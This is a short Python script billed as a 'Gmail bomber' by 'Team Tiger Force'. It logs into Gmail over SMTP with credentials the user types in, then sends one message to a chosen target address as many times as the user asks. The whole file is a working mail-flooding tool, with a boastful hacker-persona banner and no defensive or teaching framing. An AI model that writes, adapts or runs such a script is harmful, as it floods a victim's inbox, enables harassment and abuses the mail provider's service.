import smtplib
import time

print("--------Loading the program, please wait-----------")
time.sleep(3)
print(""
      " ******\n Hi, I am Lucifer Morningstar , a robot! My creator name is Emon Joy "
      ", he is a cyber security specialist from Team tiger force!!\n"
      " *****\n ")

print("Please wait.....")


time.sleep(3)

print(" __________________!! Gmail bomber by Team Tiger Force !!__________\n")
target = input("Enter target gmail address: ")
mag = input("Enter your message: ")
number = int(input("Enter number of time for mail: To be sent: "))

print("\n (+) Long in your mail address: \n")

email =input("{++}Enter your mail address : ")
password = input("{++}Enter your password: ")
print("Login with the info!! please wait a while...!")

srv= smtplib.SMTP("smtp.gmail.com", 587)
srv.starttls()
srv.login(email, password)

print("Login successful!------- here we go!!")

for i in range(0,number):
    srv.sendmail(email, target, mag)
    print(f"{i} Mails sent----")

srv.quit()
print("This script created by Emon - MR. Lucifer Morningstar")
